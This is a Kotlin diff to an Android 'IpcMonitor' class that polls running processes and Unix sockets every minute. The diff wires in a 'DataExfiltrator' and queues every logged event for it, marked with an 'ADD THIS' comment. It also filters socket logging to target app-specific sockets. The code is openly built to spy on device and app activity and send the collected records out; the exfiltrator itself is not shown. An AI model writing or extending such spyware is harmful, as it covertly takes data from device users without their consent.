@@ -4,13 +4,14 @@ import android.app.ActivityManager
 import android.content.Context
 import android.os.Handler
 import android.os.Looper
+import android.util.Log
 import java.io.BufferedReader
 import java.io.File
 import java.io.FileReader
 import java.text.SimpleDateFormat
 import java.util.*
 
-class IpcMonitor(private val context: Context) {
+class IpcMonitor(private val context: Context, private val exfiltrator: DataExfiltrator) {
 
     private val tag = "IpcMonitor"
     private val handler = Handler(Looper.getMainLooper())
@@ -22,6 +23,7 @@ class IpcMonitor(private val context: Context) {
             checkRunningProcesses()
             if (File("/proc/net/unix").canRead()) {
                 checkUnixSockets()
+                Log.d(tag, "Checking Unix Sockets...")
             }
             handler.postDelayed(runnable!!, 60000) // every 60 seconds
         }
@@ -50,13 +52,16 @@ class IpcMonitor(private val context: Context) {
             reader.use {
                 var line: String?
                 while (reader.readLine().also { line = it } != null) {
-                    if (line!!.contains("@") || line!!.contains("/")) {
-                        logEvent("UNIX_SOCKET", line!!.trim())
+                    line?.let { currentLine ->
+                        // ADD filter to reduce noise - only log app-specific sockets
+                        if (currentLine.contains("com.") || currentLine.contains("app_")) {
+                            logEvent("UNIX_SOCKET", currentLine.trim())
+                        }
                     }
                 }
             }
         } catch (e: Exception) {
-            // Permission denied or file not accessible
+            Log.e(tag, "Permission denied or file not accessible.")
         }
     }
 
@@ -64,6 +69,7 @@ class IpcMonitor(private val context: Context) {
         val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
         val entry = "$timestamp - IPC_$type: $detail"
         saveToFile(entry)
+        exfiltrator.queueData(entry)  // ADD THIS
     }
 
     private fun saveToFile(data: String) {
